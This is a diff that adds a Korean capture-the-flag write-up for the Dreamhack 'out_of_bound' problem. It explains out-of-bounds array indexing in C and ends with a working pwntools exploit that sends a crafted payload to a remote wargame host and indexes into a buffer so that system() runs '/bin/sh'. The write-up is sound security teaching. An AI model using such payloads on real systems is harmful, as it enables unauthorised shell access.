@@ -1,0 +1,92 @@
+			out_of_bound
+
+
+					Problem AUTHOR: dreamhack
+					Article Author: Kown Young Jung
+
+
+
+---[ Contents
+     1. out_of_bound
+     2. Out-of-boundary 강의 요약
+     3. 문제 풀이
+
+
+
+
+
+1. out_of_bound
+ 문제는 다음과 같이 제시된다.
+
+======================================================================
+---[ 문제 설명
+이 문제는 서버에서 작동하고 있는 서비스(out_of_bound)의 바이너리와 소스 코드가
+주어집니다.
+프로그램의 취약점을 찾고 익스플로잇해 셸을 획득하세요.
+“flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{…} 입니다.
+
+---[ 환경
+Ubuntu 16.04
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+
+---[ 문제 파일
+out_of_bound, out_of_bound.c
+======================================================================
+
+2. Out-of-boundary 강의 요약
+ OOB(Out Of Boundary)는 버퍼의 길이 범위를 벗어나는 인덱스에 접근할 때
+발생하는 취약점이다. 이는 경계 검사가 없는 프로그래밍 언어 또는 코드에서
+발생할 수 있다. 특히 C 언어의 경우에는 인덱스를 사용하여 버퍼에 접근할 때
+인덱스의 범위에 대한 별도의 경계 검사가 존재하지 않기 때문에 올바르지 않은
+값을 사용한다면 버퍼의 영역 외 메모리에 접근할 수 있다.
+
+3. 문제 풀이
+ 1.에서 제시된 C 소스 파일로부터 해당 프로그램은 OOB 취약점이 있다는 것을
+알 수 있다. 따라서 입력된 idx 값을 통해 연산된 command[idx]가 적절한
+명령어 문자열을 가리킨다면 그것이 무엇이든 system 함수는 실행시킬 것이다.
+여기서 실행시키고자 하는 명령어는 "/bin/sh"이므로 command[idx]가 이를
+가리키도록 만들어야 한다. 물론 해당 명령어는 libc에도 존재하지만 그 주소는
+ASLR(Address Space Layout Randomization)으로 인해 프로그램 실행
+시마다 바뀌게 된다. 여기서 다음과 같은 방법을 생각해볼 수 있다.
+
+======================================================================
+[cccccccccccccccccc][ .... ][AAAAPPPPSSSSSSSSS]
+^                                            ^          |        ^
+|                                             |           |        |
++-command                          |           +-----+
+		          +-name
+						c: command의 원소들
+						A: padding 문자
+						P: 명령어의 주소
+						S: 명령어 문자열
+======================================================================
+
+그리고 idx 값으로 name[4]의 주소에서 command[0]의 주소를 빼고 4로 나눈 값을
+입력한다면 command[idx]는 name[4]가 되고 name[4]는 name[8]에 있는 명령어
+문자열을 가리킬 것이므로 해당 명령어가 system 함수의 인자로 전달될 것이다.
+여기서 read syscall 다음에 scanf 함수가 사용되었기 때문에 picoCTF의 문제
+중 하나인 Unsubscriptions Are Free에서 다루었듯이 read syscall을 위한
+충분한 입력이 scanf 함수 이전에 주어져야 한다. 따라서 padding 문자가 name
+배열에 위치해야 하는 것이다. 여기서 다룬 내용으로, pwntools를 사용하여
+다음과 같은 공격 코드를 구성할 수 있다.
+
+----------
+exploit.py
+======================================================================
+from pwn import *
+
+# r = process('./out_of_bound')
+r = remote('host1.dreamhack.games', 9400)
+
+payload = "AAAA\xb4\xa0\x04\x08/bin/sh\x00"
+idx = "20"
+r.sendline(payload)
+r.sendline(idx)
+
+r.interactive()
+======================================================================
